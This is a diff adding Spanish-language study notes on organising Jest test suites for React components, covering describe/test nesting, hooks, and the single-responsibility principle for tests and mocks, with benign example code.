+### Estructura Test Suite / Test Case 
+
+1. Organización de Archivos
+Colocar los archivos de prueba directamente junto al archivo del componente que están probando.
+
+src/components/Boton/Boton.jsx
+
+src/components/Boton/Boton.test.jsx
+Las pruebas unitarias y de integración para ese componente.
+
+
+Alternativa: Carpetas `__tests__`
+Una práctica menos común hoy en día (pero aún usada, especialmente si usas Jest por defecto, que las busca automáticamente)
+
+src/components/Boton/index.jsx
+
+`src/components/Boton/__tests__/Boton.test.jsx`
+Las pruebas unitarias.
+
+La primera opción (Boton.test.jsx junto al componente) es preferida porque facilita la navegación y la visibilidad.
+
+
+2. Estructura Lógica de la Suite de Pruebas (Jest)
+
+Dentro del archivo Boton.test.jsx
+usamos describe() para la Test Suite
+test() para los Test Cases
+##### La clave es usar el anidamiento de describe() para probar diferentes estados o interacciones del componente.
+
+
+Suite Principal: El Componente
+El describe() más externo debe nombrar el componente o la unidad que estás probando.
+
+```
+// src/components/Boton/Boton.test.jsx
+
+// Suite Principal
+describe('Componente Boton', () => {
+    // Aquí van los tests generales y los hooks
+    // ...
+});
+```
+
+
+Hooks: Configuración de Componentes
+##### Utiliza beforeEach para inicializar variables o limpiar la pantalla después de cada prueba
+Esto es común en React para asegurar que el DOM simulado esté limpio.
+
+```
+describe('Componente Boton', () => {
+    // Asegura que el estado del componente no se filtre entre pruebas
+    afterEach(() => {
+        // Limpia el DOM simulado (si usas React Testing Library, por ejemplo)
+        cleanup(); 
+    });
+    // ...
+});
+```
+
+Test Cases Básicos (Rutas Felices):
+Los primeros test() prueban el rendering básico y las propiedades (props) esenciales.
+
+```
+describe('Componente Boton', () => {
+    // ... hooks ...
+
+    // Caso de Prueba 1: Verifica que se renderiza
+    test('debe renderizarse sin errores', () => {
+        // Act: Renderizamos el componente (ej. con RTL)
+        render(<Boton />);
+        // Assert: Comprobamos que el elemento existe
+        const boton = screen.getByRole('button');
+        expect(boton).toBeInTheDocument(); 
+    });
+
+    // Caso de Prueba 2: Verifica que el texto se pasa por props
+    test('debe mostrar el texto pasado por la prop "label"', () => {
+        render(<Boton label="Hacer Click" />);
+        // Assert: Comprobamos que el texto 'Hacer Click' está en el documento
+        expect(screen.getByText('Hacer Click')).toBeInTheDocument();
+    });
+});
+```
+
+
+Anidamiento: Pruebas de Interacción y Contexto
+Utiliza describe anidados para probar comportamientos específicos o contextos
+como la interacción del usuario o la respuesta a diferentes props.
+
+```
+describe('Componente Boton', () => {
+    // ... tests básicos ...
+
+    describe('Al interactuar con el botón', () => { // <--- Suite Anidada (Contexto)
+        const mockFn = jest.fn();
+
+        test('debe llamar a la función onClick al ser clickeado', async () => {
+            render(<Boton onClick={mockFn} />);
+            const boton = screen.getByRole('button');
+            
+            // Act: Simular un evento de click (ej. con fireEvent o userEvent)
+            await userEvent.click(boton); 
+            
+            // Assert: Verificar que el mock fue llamado
+            expect(mockFn).toHaveBeenCalledTimes(1);
+        });
+    });
+
+    describe('Cuando está deshabilitado', () => { // <--- Otro Contexto
+        test('no debe reaccionar al click', async () => {
+            const mockFn = jest.fn();
+            render(<Boton onClick={mockFn} disabled />);
+
+            await userEvent.click(screen.getByRole('button')); 
+
+            // Assert: El mock no debe haber sido llamado
+            expect(mockFn).not.toHaveBeenCalled();
+        });
+    });
+});
+```
+
+
+Ej: 
+
+La organización más recomendada refleja la estructura del código de producción
+utilizando la convención de nomenclatura 
+`[NombreComponente].test.jsx o [NombreComponente].spec.jsx`.
+
+```
+src/
+├── components/
+│   ├── Boton/
+│   │   ├── Boton.jsx              <-- Código del Componente (Unidad a probar)
+│   │   └── Boton.test.jsx         <-- Test Suite para Boton (Pruebas Unitarias)
+│   │
+│   ├── Header/
+│   │   ├── Header.jsx             <-- Código del Componente
+│   │   └── Header.test.jsx        <-- Test Suite para Header
+│   │
+│   └── FormularioLogin/
+│       ├── FormularioLogin.jsx    <-- Código del Componente
+│       └── FormularioLogin.test.jsx <-- Test Suite (incluye mocks de API, interacciones)
+│
+└── utils/
+    ├── helpers.js                 <-- Función de utilidad (Unidad a probar)
+    └── helpers.test.js            <-- Test Suite (Pruebas Unitarias Síncronas)
+```
+
+
+Estructura Lógica:
+.test.jsx
+
+Dentro de cada archivo de prueba (ej. Boton.test.jsx)
+##### los Test Suites (describe) anidados se usan para organizar y dar contexto a los Test Cases (test).
+
+```
+// Contenido de Boton.test.jsx
+
+// 1. TEST SUITE PRINCIPAL (Describe el componente)
+describe('Componente Boton de UI', () => {
+
+    // HOOK: Se ejecuta antes de CADA Test Case para aislar el estado.
+    beforeEach(() => {
+        // Limpieza del DOM simulado
+    });
+
+    // 2. TEST CASE BÁSICO (Verificación de renderizado)
+    test('debe renderizarse sin errores y mostrar el texto por defecto', () => {
+        // ASERCIONES (expect())
+    });
+
+    // 3. TEST SUITE ANIDADO (Contexto: Interacción de usuario)
+    describe('Cuando el usuario hace click', () => {
+        const mockFn = jest.fn();
+        
+        // 4. TEST CASE ESPECÍFICO
+        test('debe llamar a la función onClick una sola vez', async () => {
+            // ASERCIONES
+            expect(mockFn).toHaveBeenCalledTimes(1); 
+        });
+    });
+
+    // 5. TEST SUITE ANIDADO (Contexto: Estado deshabilitado)
+    describe('Cuando la prop disabled es true', () => {
+        
+        // 6. TEST CASE DE RUTA INFELIZ (Error Handling)
+        test('no debe llamar a la función onClick al ser clickeado', () => {
+            // ASERCIONES
+        });
+    });
+});
+```
+
+
+
+### SRP en Testing
+Práctica fundamental que se aplica a todos los niveles del testing
+Especialmente en el diseño de Pruebas Unitarias y en el uso de Mocks.
+
+##### Una Prueba Unitaria (Test Case) o una Test Suite (describe) debe tener una sola razón para fallar.
+Cada prueba debe enfocarse en verificar un solo comportamiento, una sola lógica o un solo resultado.
+
+1. SRP en Pruebas Unitarias: Test Case 
+
+Un Foco por Test Case:
+Práctica: Limita cada Test Case a una única aserción (expect().toBe()) o a un único propósito verificable.
+
+Beneficio: Si la prueba falla, sabes inmediatamente qué lógica se rompió. 
+Si tienes 10 aserciones en un solo test(), y la tercera falla, el reporte no es claro.
+
+Ejemplo: En lugar de probar que la función calcularTotal() aplica descuentos y maneja impuestos en una sola prueba, divídelo:
+
+```
+test('debe calcular el total sin impuestos')
+test('debe aplicar un 10% de impuesto a la venta')
+test('debe lanzar un error si el input es negativo')
+```
+
+
+SRP en la Test Suite (describe):
+
+##### Práctica: Un bloque describe() debe enfocarse en una sola unidad de código (una clase, una función principal, un componente React).
+
+Beneficio: Mantiene la organización. Si pruebas la función de Usuario y la función de Cálculo en la misma suite, rompes el aislamiento y confundes el propósito del archivo.
+
+
+2. Aplicación del SRP en Mocks
+##### Vital al diseñar tus Mocks porque su única responsabilidad es simular el comportamiento de la dependencia para la prueba actual.
+
+##### Responsabilidad del Mock: Un Mock debe imitar solo la parte de la dependencia que es relevante para la unidad que se está probando
+No debería tener que simular toda la funcionalidad de una clase compleja si solo necesitas un método.
+
+Aislamiento: Al aplicar el SRP, aseguras que el Mock solo tiene una responsabilidad
+devolver el dato simulado o el error simulado que necesitas para probar tu función.
+
+Ejemplo: Si tu función obtenerDatos() llama a un servicio de API que tiene 10 métodos
+##### tu mock solo necesita reemplazar el método obtenerUsuario(id) y devolver el JSON esperado.
+
+Sin SRP: Un mock complejo que requiere inicializar 10 métodos y propiedades, la mayoría de las cuales no son usadas por el test
+Con SRP: Un mock simple (jest.fn().mockResolvedValue(data)) cuya única responsabilidad es devolver la promesa resuelta para ese test case.
+
+
+3. Rs
+
+Test Case (test):
+Una sola aserción / Un solo comportamiento.
+Alta localización de errores: Sabes de inmediato qué se rompió.
+
+Test Suite (describe):
+Una sola unidad de código (Clase/Módulo/Componente).
+Organización y claridad: El archivo de prueba tiene un propósito claro.
+
+Mock:
+Una sola implementación simulada por test case.
+Fácil mantenimiento: Los mocks son simples, solo devuelven lo que la prueba necesita.
+
+
+
+
+### Integration
+
+### E2E
+
+
+### Rs
+
+#### test/it (test case, unidad), describe (test suite: agrupa test/it, todo entidad/módulo/componente)
+
+#### Assertions (except()), Matchers
+
+#### Mock (test case/test suite)
